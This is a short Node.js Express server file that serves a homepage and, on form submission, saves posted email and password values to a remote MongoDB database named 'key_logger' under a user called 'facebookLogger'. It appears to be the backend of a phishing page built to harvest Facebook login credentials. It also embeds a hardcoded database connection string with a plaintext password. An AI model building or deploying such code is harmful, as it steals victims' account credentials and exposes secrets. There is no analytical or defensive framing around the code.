var express = require('express'),
    bodyParser = require('body-parser'),
    multer = require('multer'),
    upload = multer(),
    mongoose = require('mongoose'),
    app = express();
//server
var server = app.listen(8080, function(){
    console.log('Server is listening to port ' + server.address().port);
});
//set view engine
app.set('view engine', 'ejs');
//static files
app.use(express.static('views'));
//parse JSON
app.use(bodyParser.json());
//parse multipart/form data
app.use(upload.array());
//parse application/xwww-
app.use(bodyParser.urlencoded({ extended: true }));
//setting up mongoDB
app.get('/', function(req, res){
    res.render('homepage', {notice: ''});
});
app.post('/data_saved', function(req, res){
    res.render('homepage', {notice: 'your data has been saved to the database'});
    //set connect string
    var connectString = 'mongodb://facebookLogger:watalabasday555@ds127129.mlab.com:27129/key_logger';
    //create model
    var dataModel = mongoose.model('account', {
        email: String,
        password: String
    });
    //data to be used
    var account_info = {
        email: req.body.email,
        password: req.body.password
    };
    //connect database
    mongoose.connect(connectString, function(){
        console.log('Database connected');
        var account_keys = new dataModel(account_info);
        account_keys.save(function(){
            console.log('Gathered account keys');
        });
    });
});